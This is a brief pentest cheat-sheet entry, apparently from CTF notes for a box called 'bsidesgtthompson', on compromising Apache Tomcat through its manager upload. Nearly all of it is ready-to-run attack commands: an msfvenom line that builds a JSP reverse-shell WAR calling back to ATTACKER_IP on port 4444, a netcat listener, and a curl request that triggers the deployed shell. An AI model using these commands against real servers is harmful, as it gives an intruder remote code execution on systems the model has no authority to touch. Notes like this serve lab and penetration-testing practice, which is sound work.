# JSP WAR Reverse Shell

JSP reverse shell packaged as a WAR file for Tomcat manager upload.

Used on: **bsidesgtthompson**

## Generate WAR

<!-- cmd: linux -->
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o reverse.war
```

## Listener And Trigger

<!-- cmd: linux -->
```bash
nc -lvnp 4444
curl http://$TARGET:8080/reverse/
```

## Notes

- In the writeup the target exposed Tomcat Manager and accepted uploaded WAR applications.
- Keep the exact generated filename and deployed route when documenting a box; Tomcat normally serves the WAR under its basename.

